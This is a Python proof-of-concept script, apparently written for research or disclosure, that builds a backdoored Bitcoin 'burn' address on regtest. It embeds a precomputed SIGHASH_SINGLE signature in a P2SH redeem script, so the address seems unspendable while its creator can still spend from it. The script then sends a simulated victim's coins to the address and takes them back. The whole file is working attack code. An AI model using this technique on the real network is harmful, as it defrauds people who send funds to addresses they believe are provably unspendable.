#!/usr/bin/env python3
#
# This script creates a backdoored "burn" address and demonstrates
# exploitation of the backdoor. It assumes bitcoind is running and
# in regtest mode.
#

import os
from bitcoin.core import x, lx, b2x, COIN, COutPoint, CMutableTxOut, \
        CMutableTxIn, CMutableTransaction
from bitcoin.core.script import CScript, SignatureHash, SIGHASH_ALL, \
        SIGHASH_SINGLE, OP_0, OP_2, OP_CHECKMULTISIG
from bitcoin.wallet import CBitcoinAddress, CBitcoinSecret
from bitcoin import SelectParams, rpc

SelectParams('regtest')

# Create new keypairs for multisig script.
seckey_single = CBitcoinSecret.from_secret_bytes(os.urandom(32))
pubkey_single = seckey_single.pub

seckey_multisig = CBitcoinSecret.from_secret_bytes(os.urandom(32))
pubkey_multisig = seckey_multisig.pub

# Create script.
multisig_script = [OP_2, pubkey_multisig, pubkey_single, OP_2,
                   OP_CHECKMULTISIG]

# Sign message "1" with seckey_single and prepend to script.
HASH_ONE = b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
sig = seckey_single.sign(HASH_ONE) + bytes([SIGHASH_SINGLE])
redeemScript = CScript([sig] + multisig_script)

# Create address from redeem script.
address = CBitcoinAddress.from_scriptPubKey(
            redeemScript.to_p2sh_scriptPubKey())
print("Burn address:", address)

# Connect to bitcoind.
bitcoin_rpc = rpc.RawProxy()
try:
    info = bitcoin_rpc.getinfo()
    if info['blocks'] > 3000:
        print("Coinbase reward not large enough to proceed. Exiting. \
               Consider cleaning your datadir (usually ~/.bitcoin/regtest)")
        exit(1)
except Exception as e:
    print("There are problems with the rpc connection to bitcoind (is it running?). \
           Exception: %s" % str(e))
    exit(1)

# Send btc to burn address (executed by victim) and put tx in a block.
burn_amount = 1
# Generate blocks (and receive coinbase reward) if the balance is too small.
if bitcoin_rpc.getbalance() < 1.0:
    bitcoin_rpc.generate(101)
bitcoin_rpc.importaddress(str(address))
burn_txid = bitcoin_rpc.sendtoaddress(str(address), burn_amount)
print("Victim sent %d btc to \"burn\" address (txid: %s)"
      % (burn_amount, burn_txid))
bitcoin_rpc.generate(1)

# Select transaction inputs.
# First take just some other input the attacker is allowed to spend.
block_hash = bitcoin_rpc.generate(1)[0]
block = bitcoin_rpc.getblock(block_hash)
coinbase = bitcoin_rpc.getrawtransaction(block["tx"][0], 1)
block_hash = bitcoin_rpc.generate(100)[0]
txin = CMutableTxIn(COutPoint(lx(coinbase["txid"]), 0))

# Now select input we received at the "burn" address.
listunspent = bitcoin_rpc.listunspent(0, 9999, [str(address)])
assert(len(listunspent) == 1)
unspent = listunspent[0]
txin2 = CMutableTxIn(COutPoint(lx(unspent["txid"]), unspent["vout"]))

# Create an output that sends the all input's coins minus fee
# to a newly created address.
dest_addr = bitcoin_rpc.getnewaddress()
coinbase_amount = coinbase["vout"][0]["value"]
fee = 10000  # in satoshi
out_amount = coinbase_amount*COIN + burn_amount*COIN - fee
txout = CMutableTxOut(out_amount, CBitcoinAddress(dest_addr).to_scriptPubKey())

# Create the transaction
tx = CMutableTransaction([txin, txin2], [txout])

# Sign inputs. Start with the coinbase input.
coinbase_address = coinbase["vout"][0]["scriptPubKey"]["addresses"][0]
seckey_coinbase = CBitcoinSecret(bitcoin_rpc.dumpprivkey(coinbase_address))
sighash = SignatureHash(CScript(x(coinbase["vout"][0]["scriptPubKey"]["hex"])),
                        tx, 0, SIGHASH_ALL)
sig = seckey_coinbase.sign(sighash) + bytes([SIGHASH_ALL])
txin.scriptSig = CScript([sig])

# Sign "burn" address input.
sighash = SignatureHash(CScript(multisig_script), tx, 1, SIGHASH_ALL)
sig = seckey_multisig.sign(sighash) + bytes([SIGHASH_ALL])
txin2.scriptSig = CScript([OP_0, sig, redeemScript])
scriptPubKey = redeemScript.to_p2sh_scriptPubKey()

# Submit transaction to bitcoind, create a block and check received amount.
txid = bitcoin_rpc.sendrawtransaction(b2x(tx.serialize()))
bitcoin_rpc.generate(1)
print("Sent coins from \"burn\" address to own address (txid: %s)" % txid)
assert(int(bitcoin_rpc.getreceivedbyaddress(str(dest_addr)) * COIN) ==
       out_amount)
print("Received %.8f (coinbase) + %.8f coins (\"burned\") - %.8f (fee)"
      % (coinbase_amount, burn_amount, float(fee)/COIN))
